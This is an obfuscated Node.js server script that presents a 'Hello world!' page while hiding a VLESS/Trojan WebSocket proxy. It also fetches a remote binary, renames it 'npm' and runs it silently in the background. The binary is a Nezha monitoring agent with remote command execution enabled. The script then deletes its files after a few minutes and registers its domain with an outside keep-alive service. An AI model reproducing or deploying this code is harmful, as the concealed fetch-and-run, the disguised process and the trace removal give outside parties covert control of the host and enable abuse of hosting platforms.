const _0x211af5=_0x5f46;function _0x564e(){const _0x53fe45=['8.8.4.4','Server\x20is\x20running\x20on\x20port\x20','npm\x20download\x20successfully','child_process','&fp=chrome&type=ws&host=','reduce','npm','asOrganization','text/html','1234.abc.com','--tls','connection','a68d978c-347f-46d7-aa93-0df647e2b865','NEZHA_KEY','trim','Answer','net','665996kvFPUH','connect','config.yaml',':443?encryption=none&security=tls&sni=','Hug','/bin/bash','digest','utf8','arch','utf-8','false','send','https://amd64.ssss.nyc.mn/v1','1184rYrxZg','2096','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','stream','writeHead','NEZHA_SERVER','application/dns-json','9037JGWdFk','split','unlink','get','error','WSPATH','trojan://','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','aarch64','Unknown','NEZHA_PORT','log','createWriteStream','1507055QmdhLO','write','Hello\x20world!','env','toString','npm\x20is\x20running','type','hex','update','vless://','8443','createServer','country','Server','close','decode','then','crypto','post','&path=%2F','test','every','length','https://arm64.ssss.nyc.mn/agent','UUID','base64','16cIzJrJ','join','error:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NAME','substr','443','replace','sha224','readUInt8','9MXaYcm','end','url','\x20with\x20all\x20DNS\x20servers','99738UeVrwc','https://','index.html',':443?security=tls&sni=','arm','Automatic\x20Access\x20Task\x20added\x20successfully','data','includes','Not\x20Found\x0a','text/plain','DOMAIN','pipe','slice','423675jRPacT','buffer','npm\x20is\x20already\x20running,\x20skip\x20running...','message','readUInt16BE','map','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','924470MXaIFJ','100LoSHPH','pop','once','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','finish','https://speed.cloudflare.com/meta','27182iwRRvl','http','Failed\x20to\x20resolve\x20','from','\x20-p\x20','PORT','catch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1.1.1.1','application/json','arm64','2053','sub','concat'];_0x564e=function(){return _0x53fe45;};return _0x564e();}(function(_0x56f71d,_0x11a86d){const _0x545d38=_0x5f46,_0x406ac2=_0x56f71d();while(!![]){try{const _0x3b2e5e=-parseInt(_0x545d38(0x1f8))/0x1*(parseInt(_0x545d38(0x221))/0x2)+-parseInt(_0x545d38(0x202))/0x3*(parseInt(_0x545d38(0x240))/0x4)+parseInt(_0x545d38(0x21a))/0x5+parseInt(_0x545d38(0x206))/0x6+parseInt(_0x545d38(0x1d1))/0x7*(parseInt(_0x545d38(0x1ca))/0x8)+parseInt(_0x545d38(0x213))/0x9*(parseInt(_0x545d38(0x21b))/0xa)+parseInt(_0x545d38(0x1de))/0xb;if(_0x3b2e5e===_0x11a86d)break;else _0x406ac2['push'](_0x406ac2['shift']());}catch(_0x1dbb27){_0x406ac2['push'](_0x406ac2['shift']());}}}(_0x564e,0x452fb));const os=require('os'),http=require(_0x211af5(0x222)),fs=require('fs'),axios=require('axios'),net=require(_0x211af5(0x23f)),path=require('path'),crypto=require(_0x211af5(0x1ef)),{Buffer}=require(_0x211af5(0x214)),{exec,execSync}=require(_0x211af5(0x232)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x211af5(0x1e1)][_0x211af5(0x1f6)]||_0x211af5(0x23b),NEZHA_SERVER=process[_0x211af5(0x1e1)][_0x211af5(0x1cf)]||'',NEZHA_PORT=process['env'][_0x211af5(0x1db)]||'',NEZHA_KEY=process[_0x211af5(0x1e1)][_0x211af5(0x23c)]||'',DOMAIN=process['env'][_0x211af5(0x210)]||_0x211af5(0x238),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x211af5(0x1e1)][_0x211af5(0x1d6)]||UUID[_0x211af5(0x212)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x211af5(0x22d),NAME=process[_0x211af5(0x1e1)][_0x211af5(0x1fc)]||_0x211af5(0x244),PORT=process[_0x211af5(0x1e1)][_0x211af5(0x226)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2278e4=_0x211af5;try{const _0x566043=await axios[_0x2278e4(0x1d4)](_0x2278e4(0x220)),_0x467c1b=_0x566043[_0x2278e4(0x20c)];ISP=(_0x467c1b[_0x2278e4(0x1ea)]+'-'+_0x467c1b[_0x2278e4(0x236)])[_0x2278e4(0x1ff)](/ /g,'_');}catch(_0x5c230d){ISP=_0x2278e4(0x1da);}};GetISP();const httpServer=http[_0x211af5(0x1e9)]((_0x20267a,_0x2546b3)=>{const _0x3ad61b=_0x211af5;if(_0x20267a[_0x3ad61b(0x204)]==='/'){const _0x34065c=path['join'](__dirname,_0x3ad61b(0x208));fs['readFile'](_0x34065c,_0x3ad61b(0x247),(_0x2e79d3,_0x3730d9)=>{const _0x1322fb=_0x3ad61b;if(_0x2e79d3){_0x2546b3[_0x1322fb(0x1ce)](0xc8,{'Content-Type':_0x1322fb(0x237)}),_0x2546b3[_0x1322fb(0x203)](_0x1322fb(0x1e0));return;}_0x2546b3[_0x1322fb(0x1ce)](0xc8,{'Content-Type':_0x1322fb(0x237)}),_0x2546b3['end'](_0x3730d9);});return;}else{if(_0x20267a[_0x3ad61b(0x204)]==='/'+SUB_PATH){const _0x55feaf=_0x3ad61b(0x1e7)+UUID+'@'+DOMAIN+_0x3ad61b(0x243)+DOMAIN+_0x3ad61b(0x233)+DOMAIN+_0x3ad61b(0x1f1)+WSPATH+'#'+NAME+'-'+ISP,_0x294500=_0x3ad61b(0x1d7)+UUID+'@'+DOMAIN+_0x3ad61b(0x209)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3ad61b(0x1f1)+WSPATH+'#'+NAME+'-'+ISP,_0x2c7c01=_0x55feaf+'\x0a'+_0x294500,_0x35eb90=Buffer[_0x3ad61b(0x224)](_0x2c7c01)['toString'](_0x3ad61b(0x1f7));_0x2546b3[_0x3ad61b(0x1ce)](0xc8,{'Content-Type':_0x3ad61b(0x20f)}),_0x2546b3[_0x3ad61b(0x203)](_0x35eb90+'\x0a');}else _0x2546b3[_0x3ad61b(0x1ce)](0x194,{'Content-Type':_0x3ad61b(0x20f)}),_0x2546b3[_0x3ad61b(0x203)](_0x3ad61b(0x20e));}}),wss=new WebSocket[(_0x211af5(0x1eb))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x211af5(0x22f),_0x211af5(0x229)];function resolveHost(_0x283d6d){return new Promise((_0x241453,_0x35b519)=>{const _0x3628db=_0x5f46;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3628db(0x1f2)](_0x283d6d)){_0x241453(_0x283d6d);return;}let _0x20f6cf=0x0;function _0x3530fd(){const _0x60a708=_0x3628db;if(_0x20f6cf>=DNS_SERVERS[_0x60a708(0x1f4)]){_0x35b519(new Error(_0x60a708(0x223)+_0x283d6d+_0x60a708(0x205)));return;}const _0x299350=DNS_SERVERS[_0x20f6cf];_0x20f6cf++;const _0x3094c7='https://dns.google/resolve?name='+encodeURIComponent(_0x283d6d)+'&type=A';axios['get'](_0x3094c7,{'timeout':0x1388,'headers':{'Accept':_0x60a708(0x1d0)}})[_0x60a708(0x1ee)](_0x1d0765=>{const _0x22f94b=_0x60a708,_0xecd944=_0x1d0765[_0x22f94b(0x20c)];if(_0xecd944['Status']===0x0&&_0xecd944[_0x22f94b(0x23e)]&&_0xecd944[_0x22f94b(0x23e)][_0x22f94b(0x1f4)]>0x0){const _0x6d0263=_0xecd944[_0x22f94b(0x23e)]['find'](_0x5756a3=>_0x5756a3[_0x22f94b(0x1e4)]===0x1);if(_0x6d0263){_0x241453(_0x6d0263['data']);return;}}_0x3530fd();})['catch'](_0x27bc7f=>{_0x3530fd();});}_0x3530fd();});}function handleVlessConnection(_0x48c43d,_0x28e544){const _0x49a4af=_0x211af5,[_0x384bce]=_0x28e544,_0x78a46e=_0x28e544[_0x49a4af(0x212)](0x1,0x11);if(!_0x78a46e[_0x49a4af(0x1f3)]((_0xefc1bd,_0x2c0560)=>_0xefc1bd==parseInt(uuid[_0x49a4af(0x1fd)](_0x2c0560*0x2,0x2),0x10)))return![];let _0x167a6d=_0x28e544[_0x49a4af(0x212)](0x11,0x12)[_0x49a4af(0x201)]()+0x13;const _0x5f15f2=_0x28e544[_0x49a4af(0x212)](_0x167a6d,_0x167a6d+=0x2)['readUInt16BE'](0x0),_0x5e7b85=_0x28e544[_0x49a4af(0x212)](_0x167a6d,_0x167a6d+=0x1)[_0x49a4af(0x201)](),_0x261dd1=_0x5e7b85==0x1?_0x28e544[_0x49a4af(0x212)](_0x167a6d,_0x167a6d+=0x4)[_0x49a4af(0x1f9)]('.'):_0x5e7b85==0x2?new TextDecoder()[_0x49a4af(0x1ed)](_0x28e544[_0x49a4af(0x212)](_0x167a6d+0x1,_0x167a6d+=0x1+_0x28e544['slice'](_0x167a6d,_0x167a6d+0x1)[_0x49a4af(0x201)]())):_0x5e7b85==0x3?_0x28e544['slice'](_0x167a6d,_0x167a6d+=0x10)[_0x49a4af(0x234)]((_0xbd83bc,_0x361a42,_0x3e5d93,_0x582d3a)=>_0x3e5d93%0x2?_0xbd83bc[_0x49a4af(0x22e)](_0x582d3a[_0x49a4af(0x212)](_0x3e5d93-0x1,_0x3e5d93+0x1)):_0xbd83bc,[])[_0x49a4af(0x218)](_0x5d277e=>_0x5d277e[_0x49a4af(0x217)](0x0)[_0x49a4af(0x1e2)](0x10))[_0x49a4af(0x1f9)](':'):'';_0x48c43d[_0x49a4af(0x1c8)](new Uint8Array([_0x384bce,0x0]));const _0x10c7d0=createWebSocketStream(_0x48c43d);return resolveHost(_0x261dd1)[_0x49a4af(0x1ee)](_0x1378ee=>{const _0x2a51db=_0x49a4af;net[_0x2a51db(0x241)]({'host':_0x1378ee,'port':_0x5f15f2},function(){const _0x6cf9a8=_0x2a51db;this['write'](_0x28e544[_0x6cf9a8(0x212)](_0x167a6d)),_0x10c7d0['on'](_0x6cf9a8(0x1d5),()=>{})[_0x6cf9a8(0x211)](this)['on'](_0x6cf9a8(0x1d5),()=>{})[_0x6cf9a8(0x211)](_0x10c7d0);})['on'](_0x2a51db(0x1d5),()=>{});})['catch'](_0x3ac9e3=>{const _0x19a80c=_0x49a4af;net['connect']({'host':_0x261dd1,'port':_0x5f15f2},function(){const _0x1dffe5=_0x5f46;this[_0x1dffe5(0x1df)](_0x28e544[_0x1dffe5(0x212)](_0x167a6d)),_0x10c7d0['on'](_0x1dffe5(0x1d5),()=>{})['pipe'](this)['on'](_0x1dffe5(0x1d5),()=>{})[_0x1dffe5(0x211)](_0x10c7d0);})['on'](_0x19a80c(0x1d5),()=>{});}),!![];}function handleTrojanConnection(_0x3e8d06,_0x3b47b0){const _0x58d7f2=_0x211af5;try{if(_0x3b47b0['length']<0x3a)return![];const _0x4f4019=_0x3b47b0[_0x58d7f2(0x212)](0x0,0x38)[_0x58d7f2(0x1e2)](),_0x3b5782=[UUID];let _0x2192d0=null;for(const _0x343ad2 of _0x3b5782){const _0x351f1c=crypto['createHash'](_0x58d7f2(0x200))[_0x58d7f2(0x1e6)](_0x343ad2)[_0x58d7f2(0x246)](_0x58d7f2(0x1e5));if(_0x351f1c===_0x4f4019){_0x2192d0=_0x343ad2;break;}}if(!_0x2192d0)return![];let _0x38673b=0x38;_0x3b47b0[_0x38673b]===0xd&&_0x3b47b0[_0x38673b+0x1]===0xa&&(_0x38673b+=0x2);const _0x2251a0=_0x3b47b0[_0x38673b];if(_0x2251a0!==0x1)return![];_0x38673b+=0x1;const _0x4e88de=_0x3b47b0[_0x38673b];_0x38673b+=0x1;let _0x57afff,_0x50d0be;if(_0x4e88de===0x1)_0x57afff=_0x3b47b0[_0x58d7f2(0x212)](_0x38673b,_0x38673b+0x4)[_0x58d7f2(0x1f9)]('.'),_0x38673b+=0x4;else{if(_0x4e88de===0x3){const _0x48176b=_0x3b47b0[_0x38673b];_0x38673b+=0x1,_0x57afff=_0x3b47b0['slice'](_0x38673b,_0x38673b+_0x48176b)['toString'](),_0x38673b+=_0x48176b;}else{if(_0x4e88de===0x4)_0x57afff=_0x3b47b0[_0x58d7f2(0x212)](_0x38673b,_0x38673b+0x10)[_0x58d7f2(0x234)]((_0x11eac0,_0x3c0103,_0x2d2aae,_0x34ff91)=>_0x2d2aae%0x2?_0x11eac0['concat'](_0x34ff91[_0x58d7f2(0x212)](_0x2d2aae-0x1,_0x2d2aae+0x1)):_0x11eac0,[])[_0x58d7f2(0x218)](_0x32ab46=>_0x32ab46[_0x58d7f2(0x217)](0x0)['toString'](0x10))[_0x58d7f2(0x1f9)](':'),_0x38673b+=0x10;else return![];}}_0x50d0be=_0x3b47b0[_0x58d7f2(0x217)](_0x38673b),_0x38673b+=0x2;_0x38673b<_0x3b47b0[_0x58d7f2(0x1f4)]&&_0x3b47b0[_0x38673b]===0xd&&_0x3b47b0[_0x38673b+0x1]===0xa&&(_0x38673b+=0x2);const _0x497fd9=createWebSocketStream(_0x3e8d06);return resolveHost(_0x57afff)[_0x58d7f2(0x1ee)](_0x2d29fe=>{const _0x254fac=_0x58d7f2;net[_0x254fac(0x241)]({'host':_0x2d29fe,'port':_0x50d0be},function(){const _0x43531c=_0x254fac;_0x38673b<_0x3b47b0[_0x43531c(0x1f4)]&&this[_0x43531c(0x1df)](_0x3b47b0[_0x43531c(0x212)](_0x38673b)),_0x497fd9['on'](_0x43531c(0x1d5),()=>{})[_0x43531c(0x211)](this)['on']('error',()=>{})[_0x43531c(0x211)](_0x497fd9);})['on'](_0x254fac(0x1d5),()=>{});})[_0x58d7f2(0x227)](_0x582f8b=>{const _0x1e8d59=_0x58d7f2;net[_0x1e8d59(0x241)]({'host':_0x57afff,'port':_0x50d0be},function(){const _0x131885=_0x1e8d59;_0x38673b<_0x3b47b0[_0x131885(0x1f4)]&&this[_0x131885(0x1df)](_0x3b47b0['slice'](_0x38673b)),_0x497fd9['on'](_0x131885(0x1d5),()=>{})['pipe'](this)['on'](_0x131885(0x1d5),()=>{})['pipe'](_0x497fd9);})['on'](_0x1e8d59(0x1d5),()=>{});}),!![];}catch(_0x4a8199){return![];}}wss['on'](_0x211af5(0x23a),(_0x361894,_0x110318)=>{const _0x6df5fc=_0x211af5,_0xbdf520=_0x110318[_0x6df5fc(0x204)]||'';_0x361894[_0x6df5fc(0x21d)](_0x6df5fc(0x216),_0x5a3c8f=>{const _0x5548ef=_0x6df5fc;if(_0x5a3c8f['length']>0x11&&_0x5a3c8f[0x0]===0x0){const _0xc09e20=_0x5a3c8f['slice'](0x1,0x11),_0x52ab6b=_0xc09e20['every']((_0x57dd4c,_0x3b5b91)=>_0x57dd4c==parseInt(uuid[_0x5548ef(0x1fd)](_0x3b5b91*0x2,0x2),0x10));if(_0x52ab6b){!handleVlessConnection(_0x361894,_0x5a3c8f)&&_0x361894[_0x5548ef(0x1ec)]();return;}}!handleTrojanConnection(_0x361894,_0x5a3c8f)&&_0x361894[_0x5548ef(0x1ec)]();})['on'](_0x6df5fc(0x1d5),()=>{});});const getDownloadUrl=()=>{const _0x54adb7=_0x211af5,_0x1124c2=os[_0x54adb7(0x1c5)]();return _0x1124c2===_0x54adb7(0x20a)||_0x1124c2===_0x54adb7(0x22b)||_0x1124c2===_0x54adb7(0x1d9)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x54adb7(0x1f5):!NEZHA_PORT?_0x54adb7(0x1c9):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x116390=_0x211af5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4c339b=getDownloadUrl(),_0x23f5da=await axios({'method':_0x116390(0x1d4),'url':_0x4c339b,'responseType':_0x116390(0x1cd)}),_0x374baf=fs[_0x116390(0x1dd)](_0x116390(0x235));return _0x23f5da[_0x116390(0x20c)][_0x116390(0x211)](_0x374baf),new Promise((_0x214567,_0x5799ed)=>{const _0x2f4874=_0x116390;_0x374baf['on'](_0x2f4874(0x21f),()=>{const _0x52601f=_0x2f4874;console[_0x52601f(0x1dc)](_0x52601f(0x231)),exec('chmod\x20+x\x20npm',_0x587cd4=>{if(_0x587cd4)_0x5799ed(_0x587cd4);_0x214567();});}),_0x374baf['on'](_0x2f4874(0x1d5),_0x5799ed);});}catch(_0x450d99){throw _0x450d99;}},runnz=async()=>{const _0x30776f=_0x211af5;try{const _0x2e8df1=execSync(_0x30776f(0x1cc),{'encoding':_0x30776f(0x1c6)});if(_0x2e8df1[_0x30776f(0x23d)]()!==''){console[_0x30776f(0x1dc)](_0x30776f(0x215));return;}}catch(_0x4561b7){}await downloadFile();let _0x598dd5='',_0x5c04c5=[_0x30776f(0x1fe),_0x30776f(0x1e8),_0x30776f(0x1cb),'2087','2083',_0x30776f(0x22c)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x44154d=_0x5c04c5[_0x30776f(0x20d)](NEZHA_PORT)?_0x30776f(0x239):'';_0x598dd5='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x30776f(0x225)+NEZHA_KEY+'\x20'+_0x44154d+_0x30776f(0x1fb);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3b9cbc=NEZHA_SERVER[_0x30776f(0x20d)](':')?NEZHA_SERVER[_0x30776f(0x1d2)](':')[_0x30776f(0x21c)]():'',_0x48d409=_0x5c04c5[_0x30776f(0x20d)](_0x3b9cbc)?'true':_0x30776f(0x1c7),_0x1a72dc='client_secret:\x20'+NEZHA_KEY+_0x30776f(0x228)+NEZHA_SERVER+_0x30776f(0x21e)+_0x48d409+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x30776f(0x242),_0x1a72dc);}_0x598dd5=_0x30776f(0x219);}else{console[_0x30776f(0x1dc)](_0x30776f(0x1d8));return;}}try{exec(_0x598dd5,{'shell':_0x30776f(0x245)},_0x49e60e=>{const _0x4d91d1=_0x30776f;if(_0x49e60e)console[_0x4d91d1(0x1d5)]('npm\x20running\x20error:',_0x49e60e);else console[_0x4d91d1(0x1dc)](_0x4d91d1(0x1e3));});}catch(_0x526c8e){console['error'](_0x30776f(0x1fa)+_0x526c8e);}};async function addAccessTask(){const _0x5977fc=_0x211af5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1c53a7=_0x5977fc(0x207)+DOMAIN;try{const _0x155fb9=await axios[_0x5977fc(0x1f0)]('https://oooo.serv00.net/add-url',{'url':_0x1c53a7},{'headers':{'Content-Type':_0x5977fc(0x22a)}});console['log'](_0x5977fc(0x20b));}catch(_0x18c210){}}const delFiles=()=>{const _0x583b2f=_0x211af5;fs[_0x583b2f(0x1d3)](_0x583b2f(0x235),()=>{}),fs['unlink'](_0x583b2f(0x242),()=>{});};function _0x5f46(_0x3e2dc8,_0x5bf266){const _0x564ea1=_0x564e();return _0x5f46=function(_0x5f46a5,_0x5c9ec0){_0x5f46a5=_0x5f46a5-0x1c5;let _0x47aa77=_0x564ea1[_0x5f46a5];return _0x47aa77;},_0x5f46(_0x3e2dc8,_0x5bf266);}httpServer['listen'](PORT,()=>{const _0x3ec6bd=_0x211af5;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3ec6bd(0x1dc)](_0x3ec6bd(0x230)+PORT);});
